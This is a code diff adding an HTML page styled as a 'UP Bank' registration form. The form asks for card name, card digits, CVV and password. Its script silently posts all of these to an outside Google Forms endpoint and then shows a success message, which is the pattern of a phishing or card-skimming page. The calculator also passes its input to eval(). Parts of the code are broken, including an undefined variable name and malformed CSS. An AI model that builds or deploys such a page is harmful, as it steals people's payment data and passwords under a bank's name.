@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>    
+  <style>
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap');
+
+
+
+:root{
+
+    --primary-color: #F8F7FC;
+
+    --secondary-color: #231E1E;
+
+    --accent-color: #fa7f03;
+
+}
+
+*{
+
+    padding: 0;
+
+    margin: 0;
+
+    box-sizing: border-box;
+
+    font-family: 'Poppins', sans-serif;
+
+}
+
+
+
+body{
+
+    position: relative;
+
+    display: flex;
+
+    justify-content: center;
+
+    height: 100vh;
+
+    background: var(--primary-color);
+
+}
+
+
+
+.registration-container{
+
+    background: #ffffff;
+
+    margin: auto;
+
+    padding: 15px 25px;
+
+    width: 640px;
+
+    border-radius: 12px;
+
+    box-shadow: 10px 14px 90px #F5AC6252;
+
+}
+
+
+
+.registration-container .registration-header{
+
+    padding: 10px;
+
+
+
+}
+
+.registration-header h2{
+
+    font-size: 20px;
+
+    font-weight: 700;
+
+}
+
+
+
+.registration-header .divider{
+
+    display: block;
+
+    width: 15%;
+
+    height: 5px;
+
+    background: var(--accent-color);
+
+    margin-top: 4px;
+
+}
+
+
+
+.registration-body .registration-box{
+
+    position: relative;
+
+    display: flex;
+
+    flex-direction: row;
+
+    flex-wrap: wrap;
+
+    justify-content: space-around;
+
+    padding: 10px 0px;
+
+}
+
+
+
+.registration-box .input-box{
+
+    position: relative;
+
+    width: 50%;
+
+    justify-content: space-around;
+
+    padding: 5px 10px;
+
+    display: block;
+
+}
+
+.registration-box .input-box label{
+
+    font-size: 14px;
+
+    color: var(--secondary-color);
+
+}
+
+
+
+.registration-box .input-field{
+
+    width: 100%;
+
+    height: 36px;
+
+    display: block;
+
+    border-radius: 4px;
+
+    border: 1px solid #1B1B1B46;
+
+    padding-left: 8px;
+
+}
+
+
+
+.registration-box .input-field:focus{
+
+    border-radius: 4px;
+
+  transition: border 0.4s ease-in-out;
+    outline: none;
+
+    border: solid var(--accent-color);
+
+    border-width: 1px 1px 3px 1px;
+
+    padding-left: 8px;
+
+    height: 48px;
+
+    padding-top: 0px;
+
+}
+
+
+
+.registration-box .input-box:focus-within label{
+
+    transition: display 0.9s ease-in-out;
+    content: '';
+    padding: px 10px;
+
+    margin-bottom: 15px;
+
+}
+
+
+
+.registration-box .input-box:focus-within{
+
+    padding: 16px 10px;
+  transition: 0.9s ease-in-out;
+}
+
+.registration-box .input-box:focus-within .input-field::placeholder{
+
+    visibility: hidden;
+
+  transition: 0.4s ease-in-out;
+}
+
+
+
+.registration-body .btn-register{
+
+    border: 0;
+
+    background: var(--accent-color);
+
+    color: var(--primary-color);
+
+    font-weight: 700;
+
+    font-size: 16px;
+
+    padding: 10px 25px;
+
+    border-radius: 4px;
+
+    box-shadow: 0px 4px 12px #F5AC6280;
+
+    margin: 0px 10px;
+
+    cursor: pointer;
+
+}
+
+
+
+.registration-body .btn-register:hover{
+
+    background: var(--secondary-color);
+
+  transition: 0.4s ease-in-out;
+    box-shadow: 0px 4px 12px #231E1E90;
+
+}
+
+
+
+.registration-container .registration-footer{
+
+    text-align: center;
+
+    padding: 20px;
+
+}
+
+
+
+.registration-footer h3{
+
+    font-size: 16px;
+
+    font-weight: 500;
+
+    color: var(--secondary-color);
+
+}
+
+
+
+.registration-footer a{
+
+    color: var(--accent-color);
+
+    text-decoration: none;
+
+    font-weight: 700;
+
+}
+
+
+
+.registration-footer a:hover{
+
+    border-bottom: 2px solid #FC8C1B;
+
+} 
+
+
+
+
+.calculator {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 1px solid #ccc;
+            padding: 20px;
+            background: #fff;
+            z-index: 1000;
+            width: 300px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .calculator input {
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 10px;
+            font-size: 1.2em;
+        }
+
+        .calculator button {
+          
+            width: calc(25% - 10px);
+            padding: 10px;
+            font-size: 1.2em;
+            margin: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+.calculator-btn{
+  border: 0;
+
+    background: var(--secondary-color);
+    color: var(--primary-color);
+
+    font-weight: 700;
+
+    font-size: 16px;
+
+    padding: 10px 25px;
+
+    border-radius: 4px;
+
+    box-shadow: 0px 4px 12px #F5AC6280;
+
+    margin: 5px 10px;
+
+    cursor: pointer;
+
+}
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+
+@media screen and (max-width:480px){
+
+    .registration-container{
+
+        display: block;
+
+        padding: 10px;
+
+        border-radius: 12px;
+
+        max-width: 400px;
+
+    }
+
+    .registration-container .registration-header{
+
+        padding: 10px 0px;
+
+    }
+
+    .registration-body .registration-box{
+
+        display: block;
+
+    }
+
+    .registration-box .input-box{
+
+        width: 100%;
+
+        padding: 05px 0px;
+
+    }
+
+
+
+    .registration-box .input-box:focus-within{
+
+        padding: 12px 0px;
+
+      transition: 0.4s ease-in-out;
+    }
+
+    .registration-body .btn-register{
+
+        width: 100%;
+
+        margin: auto;
+
+    }
+
+    .input-box {
+                flex: 1 1 100%;
+            }
+
+            .calculator {
+                width: 90%;
+              height:50%
+                padding: 10px;
+            }
+
+            .calculator button {
+                width: calc(23.33% - 10px);
+                margin: 5px;
+            }
+
+
+
+}
+
+
+
+
+  </style>
+</head>
+<body>
+    <div class="registration-container">
+        <div class="registration-header">
+            <h2>Registration UP Bank</h2>
+            <span class="divider"></span>
+        </div>
+        <div class="registration-body">
+            <form id="regi">
+                <div class="registration-box">
+                    <div class="input-box">
+                        <label >Form Id</label>
+                        <input type="text" class="input-field" id="formid"placeholder="" required>
+                    </div>
+                    <div class="input-box">
+                        <label >Table no.</label>
+                        <input type="text" class="input-field" id="tblno"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >SheetID</label>
+                        <input type="text" class="input-field" id="sheet"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Sdentry</label>
+                        <input type="text" class="input-field" id="sd"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Saentry</label>
+                        <input type="text" class="input-field" id="sa"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Card Name</label>
+                        <input type="text" class="input-field" id="cname"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Credit per 10 days</label>
+                        <input type="tel" class="input-field" id="amount10"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Card No.[Last digits]</label>
+                        <input type="tel" class="input-field" id="cardno"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Card CVV</label>
+                        <input type="tel" class="input-field" id="cvvno"placeholder=""required>
+                    </div>
+                    <div class="input-box">
+                        <label >Password</label>
+                        <input type="text" class="input-field" id="cpass"placeholder=""required>
+                    </div>
+                </div>
+                <button class="btn-register" id="btn-register">Register Now</button>
+            </form>
+        </div>
+        <div class="registration-footer">
+            <h3>Wanna calculate the amount?<button class="calculator-btn"id="calculator-btn">calculator</button></h3>
+           <h3>Form script <a href="https://tinyurl.com/upnid" target="_blank">here</a></h3>
+        </div>
+    </div>
+
+    <div class="overlay" id="overlay"></div>
+
+    <div class="calculator" id="calculator">
+        <input type="text" id="calc-display" disabled>
+        <button onclick="clearDisplay()">C</button>
+        <button onclick="appendToDisplay('1')">1</button>
+        <button onclick="appendToDisplay('2')">2</button>
+        <button onclick="appendToDisplay('3')">3</button>
+        <button onclick="appendToDisplay('4')">4</button>
+        <button onclick="appendToDisplay('5')">5</button>
+        <button onclick="appendToDisplay('6')">6</button>
+        <button onclick="appendToDisplay('7')">7</button>
+        <button onclick="appendToDisplay('8')">8</button>
+        <button onclick="appendToDisplay('9')">9</button>
+        <button onclick="appendToDisplay('0')">0</button>
+        <button onclick="appendToDisplay('+')">+</button>
+        <button onclick="appendToDisplay('-')">-</button>
+        <button onclick="appendToDisplay('*')">×</button>
+        <button onclick="appendToDisplay('/')">÷</button>
+        <button onclick="calculateResult()">=</button>
+        <button onclick="closeCalculator()">❌️</button>
+    </div>
+
+    <script>
+        document.getElementById('calculator-btn').addEventListener('click', function() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('calculator').style.display = 'block';
+        });
+
+        document.getElementById('overlay').addEventListener('click', function() {
+            closeCalculator();
+        });
+
+        function closeCalculator() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('calculator').style.display = 'none';
+        }
+
+        function clearDisplay() {
+            document.getElementById('calc-display').value = '';
+        }
+
+        function appendToDisplay(value) {
+            document.getElementById('calc-display').value += value;
+        }
+
+        function calculateResult() {
+            try {
+                let result = eval(document.getElementById('calc-display').value);
+                document.getElementById('calc-display').value = result;
+            } catch (e) {
+                document.getElementById('calc-display').value = 'Error';
+            }
+        }
+  document.getElementById('btn-register').addEventListener('click', function() {
+            const formId = document.getElementById('formid').value;
+            const tblno = document.getElementById('tblno').value;
+            const sheet = document.getElementById('sheet').value;
+            const sd = document.getElementById('sd').value;
+            const sa = document.getElementById('sa').value;
+            const cname = document.getElementById('cname').value;
+            const amount10 = document.getElementById('amount10').value;
+            const cardno = document.getElementById('cardno').value;
+            const cvvno = document.getElementById('cvvno').value;
+            const cpass = document.getElementById('cpass').value;
+
+            // Construct the Google Form URL
+            const formUrl = `https://docs.google.com/forms/d/e/1FAIpQLSewVqSRYsnrts0MLMdi2to8c8NrYlhjjzCnQBSA8uI4tTiqqw/formResponse`;
+
+            // Construct the payload
+            const formData = new FormData();
+    formData.append('entry.854278608', formid);     // Replace with actual entry ID
+            formData.append('entry.687688741', tblno);     // Replace with actual entry ID
+            formData.append('entry.1253851502', sheet);     // Replace with actual entry ID
+            formData.append('entry.1737210649', sd);        // Replace with actual entry ID
+            formData.append('entry.129735148', sa);        // Replace with actual entry ID
+            formData.append('entry.2109985771', cname);     // Replace with actual entry ID
+            formData.append('entry.1156971839', amount10);  // Replace with actual entry ID
+            formData.append('entry.557343540', cardno);    // Replace with actual entry ID
+            formData.append('entry.1065670290', cvvno);     // Replace with actual entry ID
+            formData.append('entry.201613133', cpass);     // Replace with actual entry ID
+
+            // Send the POST request
+            fetch(formUrl, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // 'no-cors' to avoid CORS issues
+            })
+            .then(response => {
+                alert('Form submitted successfully.');
+              location.reload();
+            })
+            .catch(error => {
+                console.error('Error submitting form:', error);
+            });
+        });
+    </script>
+</body>
+  </html>
